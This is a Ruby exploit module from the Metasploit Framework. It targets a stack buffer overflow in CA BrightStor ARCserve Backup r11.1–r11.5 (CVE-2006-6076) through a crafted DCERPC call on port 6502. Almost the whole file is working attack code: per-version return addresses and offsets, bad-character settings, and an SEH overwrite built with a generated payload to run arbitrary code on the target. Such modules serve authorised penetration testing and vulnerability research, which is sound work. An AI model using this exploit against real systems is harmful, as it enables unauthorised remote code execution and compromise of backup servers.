##
# $Id: tape_engine.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CA BrightStor ARCserve Tape Engine Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup
				r11.1 - r11.5. By sending a specially crafted DCERPC request, an attacker could overflow
				the buffer and execute arbitrary code.
			},
			'Author'         => [ 'MC', 'patrick' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2006-6076' ],
					[ 'OSVDB', '30637' ],
					[ 'BID', '21221' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/3086' ],
					[ 'URL', 'http://www.ca.com/us/securityadvisor/newsinfo/collateral.aspx?cid=101317' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
					'StackAdjustment' => -9500,
				},
			'Platform' => 'win',
			'Targets'  =>
					[
						[ 'BrightStor ARCserve r11.1', { 'Ret' => 0x2380cdc7, 'Offset' => 1158 } ], #p/p/r cheyprod.dll 07/21/2004
						[ 'BrightStor ARCserve r11.5', { 'Ret' => 0x2380ceb5, 'Offset' => 1132 } ], #p/p/r cheyprod.dll ??/??/????
					],
			'DisclosureDate' => 'Nov 21 2006',
			'DefaultTarget'  => 1))

		register_options([ Opt::RPORT(6502) ], self.class)
	end

	def exploit
		connect

		handle = dcerpc_handle('62b93df0-8b02-11ce-876c-00805f842837', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
		print_status("Binding to #{handle} ...")

		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		request =  "\x00\x04\x08\x0c\x02\x00\x00\x00\x00\x00"
		request << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

		dcerpc.call(43, request)

		filler = "\x10\x09\xf9\x77" + rand_text_english(target['Offset'])
		seh    = generate_seh_payload(target.ret)
		sploit = filler + seh

		print_status("Trying target #{target.name}...")

			begin
				dcerpc_call(38, sploit)
				rescue Rex::Proto::DCERPC::Exceptions::NoResponse
			end

		handler
		disconnect
	end

end
